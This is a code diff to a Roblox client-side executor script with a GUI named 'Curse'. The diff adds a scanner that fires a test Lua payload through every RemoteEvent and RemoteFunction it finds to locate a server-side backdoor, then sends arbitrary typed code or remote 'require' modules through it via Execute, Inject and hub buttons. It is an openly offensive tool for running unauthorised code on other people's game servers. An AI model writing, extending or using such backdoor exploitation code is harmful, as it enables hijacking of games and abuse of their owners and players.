@@ -1,6 +1,56 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
+
+local function findBackdoor()
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    local function randomName(length)
+        local name = ""
+        for i = 1, length do
+            local c = chars:sub(math.random(1, #chars), math.random(1, #chars))
+            name = name .. c
+        end
+        return name
+    end
+    for _, parent in ipairs({Workspace, ReplicatedStorage, Players}) do
+        for _, remote in ipairs(parent:GetDescendants()) do
+            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                local testName = randomName(8)
+                local payload = 'Instance.new("Model", workspace).Name="' .. testName .. '"'
+                local ok
+                if remote:IsA("RemoteEvent") then
+                    ok = pcall(function() remote:FireServer(payload) end)
+                else
+                    ok = pcall(function() remote:InvokeServer(payload) end)
+                end
+                if ok then
+                    task.wait(0.1)
+                    local check = Workspace:FindFirstChild(testName)
+                    if check then
+                        check:Destroy()
+                        return remote
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function sendCode(code)
+    local remote = findBackdoor()
+    if remote and typeof(remote) == "Instance" then
+        if remote:IsA("RemoteEvent") then
+            pcall(function() remote:FireServer(code) end)
+        elseif remote:IsA("RemoteFunction") then
+            pcall(function() remote:InvokeServer(code) end)
+        end
+        return true
+    else
+        return false
+    end
+end
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "Curse"
@@ -18,10 +68,7 @@ corner.CornerRadius = UDim.new(0, 12)
 corner.Parent = mainFrame
 
 local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))
-}
+gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))}
 gradient.Rotation = 0
 gradient.Parent = mainFrame
 task.spawn(function()
@@ -61,7 +108,7 @@ r6Corner.Parent = r6
 
 local textBox = Instance.new("TextBox")
 textBox.Size = UDim2.new(1, -20, 0, 140)
-textBox.Position = UDim2.new(0, 10, 0, 50)
+textBox.Position = UDim2.new(0, 10, 0, 40)
 textBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.ClearTextOnFocus = false
@@ -77,22 +124,22 @@ local textCorner = Instance.new("UICorner")
 textCorner.CornerRadius = UDim.new(0, 8)
 textCorner.Parent = textBox
 
-local execute = Instance.new("TextButton")
-execute.Size = UDim2.new(0.45, -10, 0, 40)
-execute.Position = UDim2.new(0.05, 0, 1, -45)
-execute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-execute.Text = "Execute"
-execute.Font = Enum.Font.Fantasy
-execute.TextSize = 18
-execute.TextColor3 = Color3.fromRGB(255, 255, 255)
-execute.Parent = mainFrame
+local executeBtn = Instance.new("TextButton")
+executeBtn.Size = UDim2.new(0.3, -6, 0, 40)
+executeBtn.Position = UDim2.new(0.05, 0, 1, -60)
+executeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+executeBtn.Text = "Execute"
+executeBtn.Font = Enum.Font.Fantasy
+executeBtn.TextSize = 18
+executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeBtn.Parent = mainFrame
 local execCorner = Instance.new("UICorner")
 execCorner.CornerRadius = UDim.new(0, 8)
-execCorner.Parent = execute
+execCorner.Parent = executeBtn
 
 local clear = Instance.new("TextButton")
-clear.Size = UDim2.new(0.45, -10, 0, 40)
-clear.Position = UDim2.new(0.5, 10, 1, -45)
+clear.Size = UDim2.new(0.3, -6, 0, 40)
+clear.Position = UDim2.new(0.35, 0, 1, -60)
 clear.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 clear.Text = "Clear"
 clear.Font = Enum.Font.Fantasy
@@ -102,6 +149,19 @@ clear.Parent = mainFrame
 local clearCorner = Instance.new("UICorner")
 clearCorner.CornerRadius = UDim.new(0, 8)
 clearCorner.Parent = clear
+
+local inject = Instance.new("TextButton")
+inject.Size = UDim2.new(0.3, -6, 0, 40)
+inject.Position = UDim2.new(0.65, 0, 1, -60)
+inject.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+inject.Text = "Inject"
+inject.Font = Enum.Font.Fantasy
+inject.TextSize = 18
+inject.TextColor3 = Color3.fromRGB(255, 255, 255)
+inject.Parent = mainFrame
+local injectCorner = Instance.new("UICorner")
+injectCorner.CornerRadius = UDim.new(0, 8)
+injectCorner.Parent = inject
 
 local hubFrame = Instance.new("Frame")
 hubFrame.Size = UDim2.new(0, 160, 0, 260)
@@ -140,7 +200,7 @@ local function makeButton(name, yPos, code)
 	btnCorner.CornerRadius = UDim.new(0, 6)
 	btnCorner.Parent = btn
 	btn.MouseButton1Click:Connect(function()
-		ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(code)
+		sendCode(code)
 	end)
 end
 
@@ -175,10 +235,10 @@ makeButton("KJ", y, 'require(89529616632600)("'..LocalPlayer.Name..'","KJ")')
 y = y + 45
 makeButton("Anti Ban", y, 'require(88808180999972)("'..LocalPlayer.Name..'")')
 
-execute.MouseButton1Click:Connect(function()
+executeBtn.MouseButton1Click:Connect(function()
 	local scriptText = textBox.Text
 	if scriptText ~= "" then
-		ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(scriptText)
+		sendCode(scriptText)
 	end
 end)
 
@@ -186,8 +246,18 @@ clear.MouseButton1Click:Connect(function()
 	textBox.Text = ""
 end)
 
+inject.MouseButton1Click:Connect(function()
+	local scriptText = textBox.Text
+	if scriptText ~= "" then
+		local success = sendCode(scriptText)
+		if success then
+			inject.Text = "Injected"
+		end
+	end
+end)
+
 r6.MouseButton1Click:Connect(function()
-	ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer('require(3436957371):r6("'..LocalPlayer.Name..'")')
+	sendCode('require(3436957371):r6("'..LocalPlayer.Name..'")')
 end)
 
 local dragging, dragInput, dragStart, startPos
